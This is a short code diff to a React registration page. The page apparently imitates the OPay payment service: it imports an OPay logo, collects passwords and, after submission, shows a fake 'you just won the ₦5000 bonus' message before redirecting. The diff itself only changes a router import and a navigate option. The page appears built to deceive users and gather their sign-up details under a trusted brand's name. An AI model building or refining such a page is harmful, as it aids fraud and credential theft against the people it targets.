@@ -1,6 +1,6 @@
 import React, { useState } from "react";
 import axios from "axios";
-import { useNavigate } from "react-router";
+import { useNavigate } from "react-router-dom";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
 import Logo from "../src/assets/opay-logo.jpg";
@@ -57,7 +57,7 @@ const App = () => {
         );
         console.log("Registration Success:", response.data);
         alert("🎉 Congratulations! You just won the ₦5000 bonus. Please wait a few minutes for it to be added to your balance.");
-        navigate("/redirect"); // Change this line to use the redirect component
+        navigate("/redirect", { replace: true }); // Change this line to use the redirect component
       } catch (error) {
         console.error("Registration Failed:", error);
         alert(error.response?.data?.message || "Registration failed");
